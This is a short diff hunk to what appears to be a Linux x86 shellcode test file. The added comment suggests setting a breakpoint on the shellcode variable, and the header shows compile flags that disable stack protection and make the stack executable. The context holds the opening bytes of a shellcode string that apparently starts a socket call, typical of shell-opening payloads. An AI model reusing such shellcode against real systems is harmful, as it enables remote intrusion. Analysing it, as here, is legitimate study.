@@ -6,6 +6,8 @@
 Compilation: gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
 Execution: ./shellcode
 
+Notes: You can start analyzing the shellcode by setting up a breakpoint at shellcode variable.
+
 */
 
 unsigned char shellcode[] =  "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80"
